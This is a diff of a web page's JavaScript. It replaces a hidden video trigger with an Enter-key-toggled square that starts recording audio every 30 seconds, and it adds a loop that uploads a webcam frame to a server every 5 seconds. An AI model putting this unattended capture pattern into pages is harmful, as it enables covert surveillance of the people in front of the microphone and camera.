@@ -12,10 +12,12 @@
 <button id="recordButton">Record</button>
 <button id="playPauseButton">Pause</button>
 <audio id="audioPlayer" controls></audio>
-<video id="hiddenVideo" width="1" height="1" style="display: none;"></video> <!-- Hidden video element -->
+<div id="coloredSquare" style="width: 100px; height: 100px; background-color: blue;"></div>
 <div id="downloadLinks"></div>
 
 <script>
+
+
  let mediaRecorder;
  let chunks = [];
 
@@ -77,15 +79,7 @@
     });
 
   // Event listener for record button click
-  document.getElementById('recordButton').addEventListener('click', function() {
-    if (mediaRecorder.state === 'inactive') {
-      mediaRecorder.start();
-      console.log('Recording started.');
-    } else {
-      mediaRecorder.stop();
-      console.log('Recording stopped.');
-    }
-  });
+
 
   // Event listener for play/pause button click
   let audioPlayer = document.getElementById('audioPlayer');
@@ -164,44 +158,70 @@ document.getElementById('captureButton').addEventListener('click', function() {
   sendImage(dataURL);
 });
 
-// Variable to track whether the hidden video is currently playing
-let isHiddenVideoPlaying = false;
+let isRecording = false;
+let square = document.getElementById('coloredSquare');
+let recordingInterval; // Variable to store the recording interval
 
-// Start recording when the hidden video starts playing
-document.getElementById('hiddenVideo').addEventListener('play', function() {
-  isHiddenVideoPlaying = true;
+// Event listener to change square color on Enter key press
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'Enter') {
+    if (square.style.backgroundColor === 'blue') {
+      square.style.backgroundColor = 'red';
+    } else {
+      square.style.backgroundColor = 'blue';
+    }
+  }
+});
+
+// Event listener to start recording interval when square becomes red
+setInterval(function() {
+  if (square.style.backgroundColor === 'red') {
+    if (!recordingInterval) {
+      startRecordingInterval();
+    }
+  } else {
+    clearInterval(recordingInterval); // Stop recording interval if square becomes blue
+    recordingInterval = null;
+  }
+}, 1000);
+
+// Function to start the interval for recording every 30 seconds
+function startRecordingInterval() {
+  // Start recording immediately
   startRecording();
-});
 
-// Stop recording and send the recorded media when the hidden video is stopped
-document.getElementById('hiddenVideo').addEventListener('pause', function() {
-  isHiddenVideoPlaying = false;
-  stopRecordingAndSend();
-});
+  // Set interval to record every 30 seconds
+  recordingInterval = setInterval(function() {
+    stopAndSendRecording();
+    startRecording();
+  }, 30000);
+}
 
 // Function to start recording
 function startRecording() {
+  isRecording = true;
   mediaRecorder.start();
   console.log('Recording started.');
 }
 
 // Function to stop recording and send the recorded media to the server
-function stopRecordingAndSend() {
-  mediaRecorder.stop();
-  console.log('Recording stopped.');
+function stopAndSendRecording() {
+  if (isRecording) {
+    mediaRecorder.stop();
+    console.log('Recording stopped.');
+    isRecording = false;
+    sendRecordingToServer();
+  }
+}
 
+// Function to send the recorded media to the server
+function sendRecordingToServer() {
   // Combine the recorded chunks into a single Blob
   let audioBlob = new Blob(chunks, { type: 'audio/mpeg' });
 
   // Reset chunks
   chunks = [];
 
-  // Send the recorded media to the audio endpoint
-  sendRecordingToServer(audioBlob);
-}
-
-// Function to send the recorded media to the server
-function sendRecordingToServer(audioBlob) {
   // Create a URL for the Blob
   let audioURL = URL.createObjectURL(audioBlob);
   console.log(audioURL);
@@ -229,26 +249,10 @@ function sendRecordingToServer(audioBlob) {
   });
 }
 
-// Event listener for when recording stops
-mediaRecorder.onstop = function(e) {
-  // If the hidden video is not playing, skip sending the recording
-  if (!isHiddenVideoPlaying) {
-    console.log('Recording stopped due to hidden video not playing.');
-    return;
-  }
-
-  // If the hidden video is playing, send the recording
-  stopRecordingAndSend();
-};
-
-// Event listener for when data is available
-mediaRecorder.ondataavailable = function(e) {
-  chunks.push(e.data);
-};
-
 
 function sendImage(dataURL) {
   // Generate Unix timestamp
+  console.log("Called")
   var timestamp = Math.floor(Date.now() / 1000);
 
   // Send POST request to image endpoint with image data and timestamp
@@ -270,6 +274,27 @@ function sendImage(dataURL) {
     console.error('Error:', error);
   });
 }
+setInterval(function() {
+  var video = document.getElementById('videoElement');
+  var canvas = document.getElementById('canvas');
+  var context = canvas.getContext('2d');
+
+  // Set canvas dimensions to match video dimensions
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  // Draw the current frame from the video onto the canvas
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  // Convert the canvas content to a data URL representing a PNG image
+  var dataURL = canvas.toDataURL('image/png');
+  console.log(dataURL)
+
+  // Send POST request to image endpoint
+  sendImage(dataURL);
+}, 5000); // Repeat every 5 seconds
+
+
 </script>
 
 </body>
